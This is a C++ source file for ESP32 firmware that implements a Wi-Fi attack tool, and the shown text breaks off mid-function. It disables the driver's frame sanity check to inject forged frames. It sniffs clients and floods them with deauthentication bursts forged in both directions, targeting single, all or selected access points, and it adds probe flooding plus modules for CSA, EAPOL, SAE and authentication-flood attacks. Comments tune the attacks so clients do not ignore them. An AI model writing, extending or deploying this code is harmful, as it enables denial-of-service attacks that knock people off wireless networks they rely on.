#include <WiFi.h>
#include <esp_wifi.h>
#include <sdkconfig.h>
#include <string.h>

#include "authflood.h"
#include "radio.h"
#include "csa.h"
#include "deauth.h"
#include "definitions.h"
#include "delba.h"
#include "eapol.h"
#include "pspoll.h"
#include "sae.h"
#include "tim.h"
#include "tx_guard.h"
#include "types.h"
#include "btm.h"
#include "rrm.h"

int eliminated_stations;
bool deauth_active = false;

// esp_wifi_80211_tx() rejects forged management frames through this closed-source
// check; overriding it (plus -Wl,-z,muldefs) makes raw injection possible.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

namespace {

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const uint8_t kRates[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};

// Module driver table (see deauth.h): filled once at boot by
// attack_modules_register_defaults(), read by the sniffer, attack_step() and
// attack_stop(). 12 slots is twice today's eight modules.
const attack_module_t* s_modules[12];
int s_module_count;

struct ap_target_t {
    uint8_t bssid[6];
    uint8_t channel;
    uint32_t frames;
    bool enabled;
};

struct sta_target_t {
    uint8_t mac[6];
    uint8_t ap[6];
    uint8_t channel;
    int16_t rssi;
    uint32_t frames;
};

struct rx_sample_t {
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint8_t type;
    uint8_t subtype;
    uint16_t len;
    uint8_t cat;   // action: category (37 = CSA IE found in a beacon)
    uint8_t act;   // action: action code
    uint8_t nch;   // CSA: new channel
    uint8_t cnt;   // CSA: count
    rx_radio_t radio;
};

const int kRxLogSize = 256;

attack_mode_t s_mode = ATTACK_IDLE;
uint16_t s_reason = 1;
// Reason-code mode. In random mode every burst gets a fresh code drawn from
// kReasonPool, which holds only the codes the standard actually defines --
// undefined values are frequently ignored by clients, so "uniform 1..65535"
// would make the attack look broken.
bool s_reason_random = false;
uint16_t s_reason_last = 1;

const uint16_t kReasonPool[] = {1,  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 13,
                                14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24};

ap_target_t s_aps[MAX_AP_TARGETS];
int s_ap_count = 0;
int s_ap_cursor = -1;
uint32_t s_ap_last_hop = 0;

sta_target_t s_stas[MAX_STA_TARGETS];
int s_sta_count = 0;

uint8_t s_single_bssid[6];

uint32_t s_deauth_frames = 0;
uint32_t s_probe_frames = 0;
uint32_t s_last_probe = 0;
uint32_t s_last_channel_hop = 0;
uint8_t s_probe_channel = 1;

volatile uint32_t s_rx_total = 0;
volatile uint32_t s_rx_match = 0;
// Raw injection accounting: every esp_wifi_80211_tx() call is counted, so a
// "deauth_frames grows but nothing happens" report can be split into
// "the driver refused the frame" vs "the frame went out and the client ignored it".
uint32_t s_tx_ok = 0;
uint32_t s_tx_err = 0;
int s_tx_last_err = 0;
uint32_t s_tx_err_nomem = 0;
uint32_t s_tx_err_invalid = 0;
uint32_t s_tx_err_other = 0;
uint32_t s_tx_dropped = 0;
uint32_t s_blind_frames = 0;
uint32_t s_rev_frames = 0;

// The sniffer runs in the Wi-Fi task: blasting 16 raw frames from there starves
// the driver's TX buffers (half of the calls returned ESP_ERR_NO_MEM), so the
// callback only records "who to kick" and the main loop does the injection at a
// controlled rate.
struct pending_tx_t {
    uint8_t client[6];
    uint8_t bssid[6];
};
const int kTxQueue = 16;
pending_tx_t s_txq[kTxQueue];
volatile int s_txq_head = 0;
volatile int s_txq_tail = 0;
uint32_t s_last_inject_ms = 0;
uint32_t s_last_blind_ms = 0;
// Burst in progress. A burst is 16 frames, but a single tick cannot push 16
// frames through the driver (it answers ESP_ERR_NO_MEM long before that), so the
// burst is drained frame by frame across ticks and never silently loses frames.
uint8_t s_burst_client[6];
uint8_t s_burst_bssid[6];
uint16_t s_burst_reason = 1;
int s_burst_left = 0;
uint32_t s_backoff_until_ms = 0;
// Received frames by category: management subtypes 0..15 (deauth = 12),
// beacon = 8, probe resp = 5, plus control/data totals. This is how we prove
// from a second board that our forged frames really reached the air.
volatile uint32_t s_rx_mgmt_sub[16];
volatile uint32_t s_rx_ctrl = 0;
// Control subtypes (BAR=8, BA=9, PS-Poll=10, RTS=11, CTS=12, ACK=13, ...):
// the aggregate counter alone cannot show *which* control frames the radio hands up.
volatile uint32_t s_rx_ctrl_sub[16];
volatile uint32_t s_rx_data = 0;
volatile uint32_t s_rx_action = 0;      // management subtype 13
volatile uint32_t s_rx_csa_action = 0;  // action category 4 / action 4
volatile uint32_t s_rx_csa_ie = 0;      // beacon/probe response carrying element 37
volatile uint32_t s_rx_addba = 0;       // action category 3, action 0/1 (ADDBA)
volatile uint32_t s_rx_delba = 0;       // action category 3, action 2 (DELBA)
// A few decoded CSA frames kept for RXLOG, so a receiver can print what it saw
// (channel/count) instead of only counting them.
const int kCsaLogSize = 4;
rx_sample_t s_csa_log[kCsaLogSize];
int s_csa_log_count = 0;
// Ring buffer: the monitor window is short, so the frames worth printing are
// the newest ones. Filling an array and stopping at full loses exactly those.
rx_sample_t s_rx_log[kRxLogSize];
volatile int s_rx_log_head = 0;   // next slot to write
volatile int s_rx_log_count = 0;  // valid entries, saturates at kRxLogSize

bool s_mon_active = false;
uint32_t s_mon_until = 0;
uint8_t s_mon_channel = 0;
uint32_t s_mon_last_hop = 0;
uint8_t s_mon_hop = 1;

bool s_sta_scan_active = false;
uint32_t s_sta_scan_deadline = 0;
uint8_t s_sta_scan_channel = 1;
uint32_t s_sta_scan_last_hop = 0;
bool s_sta_scan_ready = false;

uint32_t pseudo_rand(void) {
    static uint32_t state = 0x12345678;
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state;
}

void random_mac(uint8_t* mac) {
    const uint32_t r = pseudo_rand();
    mac[0] = 0x02 | (r & 0xFC);  // locally administered, unicast
    mac[1] = (r >> 8) & 0xFF;
    mac[2] = (r >> 16) & 0xFF;
    mac[3] = (r >> 24) & 0xFF;
    mac[4] = pseudo_rand() & 0xFF;
    mac[5] = pseudo_rand() & 0xFF;
}

void random_ssid(char* ssid, size_t max_len) {
    static const char alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const size_t max_body = (max_len > 14) ? 11 : 6;
    const size_t len = 4 + (pseudo_rand() % max_body);
    for (size_t i = 0; i < len && i + 1 < max_len; i++) {
        ssid[i] = alphabet[pseudo_rand() % (sizeof(alphabet) - 1)];
    }
    ssid[len] = 0;
}

// ------------------------------------------------------------------ radio setup

void apply_band_mode(void) {
#if CONFIG_SOC_WIFI_SUPPORT_5G
    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
#endif
}

void apply_country(uint8_t channel, bool all_channels) {
    wifi_country_t country = {};
    memcpy(country.cc, "CN", 2);
    country.schan = 1;
    country.nchan = 13;
    if (!all_channels && channel <= 11) {
        memcpy(country.cc, "01", 2);
        country.nchan = 11;
    }
#if CONFIG_SOC_WIFI_SUPPORT_5G
    country.wifi_5g_channel_mask = WIFI_CHANNEL_36 | WIFI_CHANNEL_40 | WIFI_CHANNEL_44 |
                                   WIFI_CHANNEL_48 | WIFI_CHANNEL_52 | WIFI_CHANNEL_56 |
                                   WIFI_CHANNEL_60 | WIFI_CHANNEL_64 | WIFI_CHANNEL_100 |
                                   WIFI_CHANNEL_104 | WIFI_CHANNEL_108 | WIFI_CHANNEL_112 |
                                   WIFI_CHANNEL_116 | WIFI_CHANNEL_120 | WIFI_CHANNEL_124 |
                                   WIFI_CHANNEL_128 | WIFI_CHANNEL_132 | WIFI_CHANNEL_136 |
                                   WIFI_CHANNEL_140 | WIFI_CHANNEL_144 | WIFI_CHANNEL_149 |
                                   WIFI_CHANNEL_153 | WIFI_CHANNEL_157 | WIFI_CHANNEL_161 |
                                   WIFI_CHANNEL_165;
#endif
    country.max_tx_power = 20;
    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&country);
}

uint8_t next_probe_channel(void) {
    static const uint8_t channels[] = {1, 6, 11, 3, 9, 13, 2, 7, 12};
    s_probe_channel = channels[pseudo_rand() % (sizeof(channels))];
    return s_probe_channel;
}

void radio_to_sta(void) {
    WiFi.disconnect();
    WiFi.mode(WIFI_MODE_STA);
}

// ------------------------------------------------------------------ frames

// dest/src/bssid are explicit so both directions can be forged:
//   AP -> STA : dest = client, src = bssid, bssid = AP
//   STA -> AP : dest = bssid,  src = client, bssid = AP
size_t build_deauth_ex(uint8_t* frame, const uint8_t dest[6], const uint8_t src[6],
                       const uint8_t bssid[6], uint16_t reason) {
    memset(frame, 0, 26);
    frame[0] = 0xC0;  // deauth
    memcpy(frame + 4, dest, 6);
    memcpy(frame + 10, src, 6);
    memcpy(frame + 16, bssid, 6);
    frame[22] = 0xF0;
    frame[23] = 0xFF;
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
    return 26;
}

size_t build_deauth(uint8_t* frame, const uint8_t station[6], const uint8_t bssid[6],
                    uint16_t reason) {
    return build_deauth_ex(frame, station, bssid, bssid, reason);
}

// Beacon (subtype 8) and probe response (subtype 5) share the same body layout.
size_t build_beacon_like(uint8_t* frame, uint8_t subtype, const uint8_t dest[6],
                         const uint8_t bssid[6], const char* ssid, uint8_t channel) {
    size_t n = 0;
    frame[n++] = (uint8_t)((subtype << 4) | 0x00);
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    memcpy(frame + n, dest, 6);
    n += 6;
    memcpy(frame + n, bssid, 6);
    n += 6;
    memcpy(frame + n, bssid, 6);
    n += 6;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    memset(frame + n, 0, 8);  // timestamp
    n += 8;
    frame[n++] = 0x64;  // beacon interval 100 TU
    frame[n++] = 0x00;
    frame[n++] = 0x31;  // capability: ESS | short slot | short preamble
    frame[n++] = 0x04;
    const size_t len = strlen(ssid);
    frame[n++] = 0x00;  // SSID
    frame[n++] = (uint8_t)len;
    memcpy(frame + n, ssid, len);
    n += len;
    frame[n++] = 0x01;  // supported rates
    frame[n++] = sizeof(kRates);
    memcpy(frame + n, kRates, sizeof(kRates));
    n += sizeof(kRates);
    frame[n++] = 0x03;  // DS parameter
    frame[n++] = 1;
    frame[n++] = channel;
    return n;
}

int find_ap(const uint8_t bssid[6]);

void reset_diag_counters(void) {
    s_tx_ok = 0;
    s_tx_err = 0;
    s_tx_last_err = 0;
    s_tx_err_nomem = 0;
    s_tx_err_invalid = 0;
    s_tx_err_other = 0;
    s_tx_dropped = 0;
    s_blind_frames = 0;
    s_rev_frames = 0;
    s_txq_head = 0;
    s_txq_tail = 0;
    s_last_inject_ms = 0;
    s_last_blind_ms = 0;
    s_burst_left = 0;
    s_backoff_until_ms = 0;
    s_rx_ctrl = 0;
    for (int i = 0; i < 16; i++) {
        s_rx_ctrl_sub[i] = 0;
    }
    s_rx_data = 0;
    s_rx_action = 0;
    s_rx_csa_action = 0;
    s_rx_csa_ie = 0;
    s_rx_addba = 0;
    s_rx_delba = 0;
    s_csa_log_count = 0;
    for (int i = 0; i < 16; i++) {
        s_rx_mgmt_sub[i] = 0;
    }
}

void queue_deauth(const uint8_t client[6], const uint8_t bssid[6]) {
    const int next = (s_txq_head + 1) % kTxQueue;
    if (next == s_txq_tail) {
        s_tx_dropped++;
        return;
    }
    memcpy(s_txq[s_txq_head].client, client, 6);
    memcpy(s_txq[s_txq_head].bssid, bssid, 6);
    s_txq_head = next;
}

uint16_t next_reason(void) {
    if (!s_reason_random) {
        s_reason_last = s_reason;
        return s_reason;
    }
    s_reason_last = kReasonPool[pseudo_rand() % (sizeof(kReasonPool) / sizeof(kReasonPool[0]))];
    return s_reason_last;
}

// Returns true when the driver accepted the frame.
bool tx_raw(uint8_t* frame, size_t len) {
    // The burst policy: no pacing (attack_step() schedules the 2 unicast + 1
    // broadcast bundle) and 0x101 only backs off, because a reboot here would throw
    // away the scan table and station list mid-attack.
    const esp_err_t res = tx_guard_send_as(&kTxPolicyBurst, frame, (uint16_t)len);
    if (res != ESP_OK) {
        s_tx_err++;
        s_tx_last_err = (int)res;
        // Buffers are full: backing off 5 ms is much cheaper than hammering the
        // driver every millisecond (which is what inflated txerr before).
        s_backoff_until_ms = millis() + 5;
        if (res == ESP_ERR_NO_MEM) {
            s_tx_err_nomem++;
        } else if (res == ESP_ERR_INVALID_ARG) {
            s_tx_err_invalid++;
        } else {
            s_tx_err_other++;
        }
        return false;
    }
    s_tx_ok++;
    s_deauth_frames++;
    return true;
}

// AP -> STA: the AP appears to kick the client.
bool inject_one(const uint8_t station[6], const uint8_t bssid[6], uint16_t reason) {
    uint8_t frame[32];
    const size_t len = build_deauth(frame, station, bssid, reason);
    return tx_raw(frame, len);
}

// STA -> AP: the client appears to leave. The AP tears the association down and
// usually tells the client itself, which covers clients that ignore forged
// AP-originated deauth frames.
bool inject_reverse(const uint8_t station[6], const uint8_t bssid[6], uint16_t reason) {
    uint8_t frame[32];
    const size_t len = build_deauth_ex(frame, bssid, station, bssid, reason);
    if (!tx_raw(frame, len)) {
        return false;
    }
    s_rev_frames++;
    return true;
}

// Push as much of the pending burst as the driver accepts, then stop and resume
// on the next tick (attack_step calls this every few ms).
void drain_tx_queue(void) {
    if (s_burst_left == 0) {
        if (s_txq_tail == s_txq_head) {
            return;
        }
        memcpy(s_burst_client, s_txq[s_txq_tail].client, 6);
        memcpy(s_burst_bssid, s_txq[s_txq_tail].bssid, 6);
        s_txq_tail = (s_txq_tail + 1) % kTxQueue;
        s_burst_left = NUM_FRAMES_PER_DEAUTH;
        s_burst_reason = next_reason();
        eliminated_stations++;
        if (s_mode == ATTACK_DEAUTH_MULTI) {
            const int idx = find_ap(s_burst_bssid);
            if (idx >= 0) {
                s_aps[idx].frames +=
                    NUM_FRAMES_PER_DEAUTH + NUM_REVERSE_PER_DEAUTH + NUM_BROADCAST_PER_DEAUTH;
            }
        }
    }
    while (s_burst_left > 0) {
        if (!inject_one(s_burst_client, s_burst_bssid, s_burst_reason)) {
            return;  // buffers full: retry this frame after the backoff
        }
        s_burst_left--;
    }

    // Reverse direction: forge the frame the client itself would send when
    // leaving the BSS. Costs one frame and covers clients that filter deauth
    // frames "from the AP".
    for (int i = 0; i < NUM_REVERSE_PER_DEAUTH; i++) {
        if (!inject_reverse(s_burst_client, s_burst_bssid, s_burst_reason)) {
            return;
        }
    }

    // One broadcast deauth on top of the unicast burst: plenty of cheap clients
    // only act on the broadcast form, and it costs a single frame.
    for (int i = 0; i < NUM_BROADCAST_PER_DEAUTH; i++) {
        if (!inject_one(kBroadcast, s_burst_bssid, s_burst_reason)) {
            return;
        }
    }
}

int find_ap(const uint8_t bssid[6]) {
    for (int i = 0; i < s_ap_count; i++) {
        if (s_aps[i].enabled && memcmp(s_aps[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

// ------------------------------------------------------------------ sniffer

// The two targets report different rx_ctrl: the classic ESP32 has
// sig_mode/mcs/sgi, the C5 has cur_bb_format plus a raw L-SIG rate field.
// Normalising here keeps the printers free of target checks.
IRAM_ATTR static void fill_radio_meta(const wifi_pkt_rx_ctrl_t* rc, rx_radio_t* out) {
    out->rssi = (int16_t)rc->rssi;
    out->channel = (uint8_t)(rc->channel);
#if CONFIG_SOC_WIFI_HE_SUPPORT
    out->fmt = (uint8_t)(rc->cur_bb_format);
    out->rate = (uint8_t)(rc->rate);
    // MCS sits in he_siga1, which Espressif leaves undocumented: 0 on purpose.
    out->mcs = 0;
    out->sgi = 0;
#else
    const uint8_t sig_mode = (uint8_t)(rc->sig_mode);
    out->fmt = (sig_mode == 1) ? 2 : ((sig_mode == 0) ? 0 : 3);
    out->rate = (uint8_t)(rc->rate);
    out->mcs = (uint8_t)(rc->mcs);
    out->sgi = (uint8_t)(rc->sgi);
#endif
}

IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
    const wifi_packet_t* packet = (wifi_packet_t*)raw->payload;
    const mac_hdr_t* hdr = &packet->hdr;

    s_rx_total = s_rx_total + 1;

    const uint16_t sig_len = raw->rx_ctrl.sig_len;
    const uint16_t fc = hdr->frame_ctrl;
    const uint8_t frame_type = (uint8_t)((fc >> 2) & 0x03);
    const uint8_t frame_subtype = (uint8_t)((fc >> 4) & 0x0F);
    if (frame_type == 0) {
        if (frame_subtype < 16) {
            s_rx_mgmt_sub[frame_subtype] = s_rx_mgmt_sub[frame_subtype] + 1;
        }
    } else if (frame_type == 1) {
        s_rx_ctrl = s_rx_ctrl + 1;
        if (frame_subtype < 16) {
            s_rx_ctrl_sub[frame_subtype] = s_rx_ctrl_sub[frame_subtype] + 1;
        }
    } else if (frame_type == 2) {
        s_rx_data = s_rx_data + 1;
    }

    // RTS is 16 bytes and a broadcast Block Ack Request is 20, both well under
    // sizeof(mac_hdr_t). Rejecting those here made every control frame invisible.
    if (sig_len < 16) {
        return;
    }
    for (int i = 0; i < s_module_count; i++) {
        if (s_modules[i]->on_rx != nullptr) {
            s_modules[i]->on_rx((const uint8_t*)hdr, sig_len, frame_type, frame_subtype);
        }
    }

    // CSA recognition: action frames (cat 4 / act 4) and beacons with IE 37.
    uint8_t cat = 0;
    uint8_t act = 0;
    uint8_t csa_ch = 0;
    uint8_t csa_cnt = 0;
    const uint8_t* payload = (const uint8_t*)hdr;
    if (frame_type == 0 && frame_subtype == 13) {
        s_rx_action = s_rx_action + 1;
        if (sig_len >= 29) {
            cat = payload[24];
            act = payload[25];
            csa_ch = payload[27];
            csa_cnt = payload[28];
            if (cat == 3) {
                if (act <= 1) {
                    s_rx_addba = s_rx_addba + 1;
                } else if (act == 2) {
                    s_rx_delba = s_rx_delba + 1;
                }
            }
            if (cat == 4 && act == 4) {
                s_rx_csa_action = s_rx_csa_action + 1;
                if (s_csa_log_count < kCsaLogSize) {
                    rx_sample_t* sample = &s_csa_log[s_csa_log_count++];
                    memcpy(sample->src, hdr->src, 6);
                    memcpy(sample->dest, hdr->dest, 6);
                    memcpy(sample->bssid, hdr->bssid, 6);
                    sample->type = frame_type;
                    sample->subtype = frame_subtype;
                    sample->len = sig_len;
                    sample->cat = cat;
                    sample->act = act;
                    sample->nch = csa_ch;
                    sample->cnt = csa_cnt;
                }
            }
        }
    } else if (frame_type == 0 && (frame_subtype == 8 || frame_subtype == 5) && sig_len > 36) {
        const uint8_t* p = payload + 36;
        const uint8_t* end = payload + sig_len;
        while (p + 2 <= end) {
            const uint8_t ie_len = p[1];
            if (p + 2 + ie_len > end) {
                break;
            }
            if (p[0] == 37 && ie_len == 3) {
                s_rx_csa_ie = s_rx_csa_ie + 1;
                cat = 37;
                csa_ch = p[3];
                csa_cnt = p[4];
                break;
            }
            p += 2 + ie_len;
        }
    }

    // ACK/CTS are delivered now that the control-subtype filter is open, and a
    // busy BSS produces thousands per second: count them, but do not let them
    // flush the sample ring (RXLOG is meant to show interesting frames).
    const bool keep_sample = !(frame_type == 1 && (frame_subtype == 12 || frame_subtype == 13));
    if (keep_sample) {
        rx_sample_t* sample = &s_rx_log[s_rx_log_head];
        memcpy(sample->dest, hdr->dest, 6);
        memcpy(sample->src, hdr->src, 6);
        // RTS stops at Addr2 and PS-Poll stops at Addr1, so Addr3 only exists
        // from 22 bytes up. Reading it anyway pulled garbage out of the buffer.
        if (sig_len >= 22) {
            memcpy(sample->bssid, hdr->bssid, 6);
        } else {
            memset(sample->bssid, 0, 6);
        }
        sample->type = frame_type;
        sample->subtype = frame_subtype;
        sample->len = sig_len;
        sample->cat = cat;
        sample->act = act;
        sample->nch = csa_ch;
        sample->cnt = csa_cnt;
        fill_radio_meta(&raw->rx_ctrl, &sample->radio);
        sample->radio.duration = hdr->duration;
        s_rx_log_head = (s_rx_log_head + 1) % kRxLogSize;
        if (s_rx_log_count < kRxLogSize) {
            s_rx_log_count = s_rx_log_count + 1;
        }
    }

    // Address fields present? Control frames are short: RTS / PS-Poll carry
    // Addr1+Addr2 in 16 bytes (+4 FCS = 20), so the management-oriented 22 byte
    // threshold used to reject every RTS before its Addr2 was ever looked at.
    const bool is_ctrl = (frame_type == 1);
    const bool has_addr2 = is_ctrl ? (sig_len >= 20) : (sig_len >= 22);
    const bool has_addr3 = !is_ctrl && (sig_len >= 28);

    if (s_sta_scan_active) {
        if (has_addr2 && memcmp(hdr->dest, kBroadcast, 6) != 0 &&
            memcmp(hdr->src, hdr->bssid, 6) != 0) {
            for (int i = 0; i < s_sta_count; i++) {
                if (memcmp(s_stas[i].mac, hdr->src, 6) == 0) {
                    s_stas[i].rssi = (int16_t)raw->rx_ctrl.rssi;
                    s_stas[i].channel = s_sta_scan_channel;
                    s_stas[i].frames++;
                    return;
                }
            }
            if (s_sta_count < MAX_STA_TARGETS) {
                sta_target_t* sta = &s_stas[s_sta_count++];
                memcpy(sta->mac, hdr->src, 6);
                if (has_addr3) {
                    memcpy(sta->ap, hdr->bssid, 6);
                } else {
                    memset(sta->ap, 0, 6);
                }
                sta->channel = s_sta_scan_channel;
                sta->rssi = (int16_t)raw->rx_ctrl.rssi;
                sta->frames = 1;
            }
        }
        return;
    }

    if (s_mode == ATTACK_DEAUTH_SINGLE) {
        bool matched = false;
        uint8_t client[6];
        if (has_addr2 && memcmp(hdr->dest, s_single_bssid, 6) == 0) {
            memcpy(client, hdr->src, 6);
            matched = true;
        } else if (has_addr3 && memcmp(hdr->bssid, s_single_bssid, 6) == 0 &&
                   memcmp(hdr->dest, kBroadcast, 6) != 0 &&
                   memcmp(hdr->dest, s_single_bssid, 6) != 0) {
            memcpy(client, hdr->dest, 6);
            matched = true;
        }
        if (matched) {
            s_rx_match = s_rx_match + 1;
            queue_deauth(client, s_single_bssid);
        }
        return;
    }

    if (s_mode == ATTACK_DEAUTH_MULTI) {
        if (has_addr2 && memcmp(hdr->dest, kBroadcast, 6) != 0) {
            const int idx = find_ap(hdr->dest);
            if (idx >= 0) {
                s_rx_match = s_rx_match + 1;
                queue_deauth(hdr->src, hdr->dest);
                return;
            }
        }
        if (has_addr3) {
            const int idx = find_ap(hdr->bssid);
            if (idx >= 0 && memcmp(hdr->dest, kBroadcast, 6) != 0 &&
                memcmp(hdr->dest, hdr->bssid, 6) != 0) {
                s_rx_match = s_rx_match + 1;
                queue_deauth(hdr->dest, hdr->bssid);
            }
        }
    }
}

// ------------------------------------------------------------------ helpers

void start_promiscuous(void) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    // Second-stage filter, and it is *not* optional: the type mask above only
    // says "control frames are wanted", while this one decides which control
    // subtypes are actually handed up. Its default drops every control frame,
    // so without this call ACK / BA / BAR / RTS never appear even though the
    // type mask has CTRL set. WIFI_PROMIS_CTRL_FILTER_MASK_ALL = pass them all;
    // measured on hardware: mask 0 -> ctrl=0, mask ALL -> rts/ack/ba/bar counted.
    wifi_promiscuous_filter_t ctrl_filter = {0};
    ctrl_filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void fill_ap_table(void) {
    s_ap_count = 0;
    // Reuse the cached scan result instead of blocking the loop for another scan.
    int n = WiFi.scanComplete();
    if (n < 0) {
        n = WiFi.scanNetworks();
    }
    for (int i = 0; i < n && s_ap_count < MAX_AP_TARGETS; i++) {
        const uint8_t* bssid = WiFi.BSSID(i);
        if (bssid == nullptr) {
            continue;
        }
        ap_target_t* ap = &s_aps[s_ap_count++];
        memcpy(ap->bssid, bssid, 6);
        ap->channel = WiFi.channel(i);
        ap->frames = 0;
        ap->enabled = true;
    }
}

void begin_multi(uint16_t reason) {
    s_reason = reason;
    s_mode = ATTACK_DEAUTH_MULTI;
    s_ap_cursor = -1;
    s_ap_last_hop = 0;
    eliminated_stations = 0;
    s_deauth_frames = 0;
    s_rx_total = 0;
    s_rx_match = 0;
    s_rx_log_head = 0;
    s_rx_log_count = 0;
    reset_diag_counters();
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
    radio_to_sta();
    start_promiscuous();
    deauth_active = true;
}

}  // namespace

// ------------------------------------------------------------------ public API

void prepare_radio_for_scan() {
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
}

uint8_t sweep_next_channel() {
    s_probe_channel = (s_probe_channel % CHANNEL_MAX) + 1;
    radio_set_channel("deauth", s_probe_channel);
    return s_probe_channel;
}

bool attack_deauth_single(int index, uint16_t reason) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_single_bssid, bssid, 6);
    const uint8_t channel = WiFi.channel(index);
    s_reason = reason;
    s_mode = ATTACK_DEAUTH_SINGLE;
    eliminated_stations = 0;
    s_deauth_frames = 0;
    s_rx_total = 0;
    s_rx_match = 0;
    s_rx_log_head = 0;
    s_rx_log_count = 0;
    reset_diag_counters();
    s_ap_count = 0;

    apply_band_mode();
    apply_country(channel, false);
    radio_to_sta();
    radio_set_channel("deauth", channel);
    start_promiscuous();
    deauth_active = true;
    return true;
}

bool attack_deauth_all(uint16_t reason) {
    fill_ap_table();
    if (s_ap_count == 0) {
        return false;
    }
    for (int i = 0; i < s_ap_count; i++) {
        s_aps[i].enabled = true;
    }
    begin_multi(reason);
    return true;
}

bool attack_deauth_only(const int* idx, int count, uint16_t reason) {
    fill_ap_table();
    if (s_ap_count == 0) {
        return false;
    }
    for (int i = 0; i < s_ap_count; i++) {
        s_aps[i].enabled = false;
    }
    int enabled = 0;
    for (int k = 0; k < count; k++) {
        if (idx[k] >= 0 && idx[k] < s_ap_count) {
            s_aps[idx[k]].enabled = true;
            enabled++;
        }
    }
    if (enabled == 0) {
        return false;
    }
    begin_multi(reason);
    return true;
}

bool attack_deauth_except(const int* idx, int count, uint16_t reason) {
    fill_ap_table();
    if (s_ap_count == 0) {
        return false;
    }
    for (int i = 0; i < s_ap_count; i++) {
        s_aps[i].enabled = true;
    }
    for (int k = 0; k < count; k++) {
        if (idx[k] >= 0 && idx[k] < s_ap_count) {
            s_aps[idx[k]].enabled = false;
        }
    }
    begin_multi(reason);
    return true;
}

bool attack_probe_broadcast() {
    reset_diag_counters();
    s_mode = ATTACK_PROBE_BROADCAST;
    s_probe_frames = 0;
    s_last_probe = 0;
    s_last_channel_hop = 0;
    eliminated_stations = 0;
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
    radio_to_sta();
    radio_set_channel("deauth", next_probe_channel());
    deauth_active = true;
    return true;
}

// Passive monitor window: fixed channel (0 = hop 1..13) for N seconds, with a
// clean counter slate so a second board can report exactly what it heard.
void monitor_begin(uint8_t channel, uint16_t seconds) {
    reset_diag_counters();
    s_rx_log_head = 0;
    s_rx_log_count = 0;
    s_mon_channel = channel;
    s_mon_hop = 1;
    s_mon_last_hop = 0;
    s_mon_until = millis() + (uint32_t)seconds * 1000UL;
    s_mon_active = true;
    apply_band_mode();
    if (channel != 0) {
        apply_country(channel, false);
        radio_to_sta();
        radio_set_channel("deauth", channel);
    } else {
        apply_country(CHANNEL_MAX, true);
        radio_to_sta();
    }
    start_promiscuous();
}

bool monitor_active() {
    return s_mon_active;
}

uint32_t attack_rx_action() {
    return s_rx_action;
}

uint32_t attack_rx_csa_action() {
    return s_rx_csa_action;
}

uint32_t attack_rx_csa_ie() {
    return s_rx_csa_ie;
}

void attack_rx_ctrl_mix(uint32_t sub[16]) {
    for (int i = 0; i < 16; i++) {
        sub[i] = s_rx_ctrl_sub[i];
    }
}

uint32_t attack_rx_addba() {
    return s_rx_addba;
}

uint32_t attack_rx_delba() {
    return s_rx_delba;
}

// ---- module driver table ---------------------------------------------------

bool attack_module_register(const attack_module_t* module) {
    if (module == nullptr) return false;
    if (s_module_count >= (int)(sizeof(s_modules) / sizeof(s_modules[0]))) return false;
    s_modules[s_module_count++] = module;
    return true;
}

int attack_module_count(void) { return s_module_count; }

void attack_modules_register_defaults(void) {
    // Same order the three flat chains used to be written in. Order matters for
    // on-air behaviour: two modules listening to the same frame type may act on it.
    static const attack_module_t kModules[] = {
        {"csa", csa_step, csa_stop, csa_on_rx},
        {"delba", delba_step, delba_stop, delba_on_rx},
        {"btm", btm_step, btm_stop, btm_on_rx},
        {"rrm", rrm_step, rrm_stop, rrm_on_rx},
        {"tim", tim_step, tim_stop, tim_on_rx},
        {"eapol", eapol_step, eapol_stop, eapol_on_rx},
        {"pspoll", pspoll_step, pspoll_stop, pspoll_on_rx},
        {"sae", sae_step, sae_stop, sae_on_rx},
        {"authflood", authflood_step, authflood_stop, authflood_on_rx},
    };
    for (const attack_module_t& module : kModules) {
        attack_module_register(&module);
    }
}

void attack_sniffer_enable() {
    start_promiscuous();
}

void attack_stop() {
    for (int i = 0; i < s_module_count; i++) {
        if (s_modules[i]->stop != nullptr) s_modules[i]->stop();
    }
    esp_wifi_set_promiscuous(false);
    deauth_active = false;
    s_mode = ATTACK_IDLE;
}

void attack_step() {
    const uint32_t now = millis();
    for (int i = 0; i < s_module_count; i++) {
        if (s_modules[i]->step != nullptr) s_modules[i]->step();
    }

    if (s_mon_active) {
        if (s_mon_channel == 0 && now - s_mon_last_hop > 150) {
            s_mon_last_hop = now;
            s_mon_hop = (s_mon_hop % CHANNEL_MAX) + 1;
            radio_set_channel("deauth", s_mon_hop);
        }
        if ((int32_t)(now - s_mon_until) >= 0) {
            s_mon_active = false;
            esp_wifi_set_promiscuous(false);
        }
        return;
    }

    if (s_sta_scan_active) {
        if (now - s_sta_scan_last_hop > 150) {
            s_sta_scan_last_hop = now;
            s_sta_scan_channel = (s_sta_scan_channel % CHANNEL_MAX) + 1;
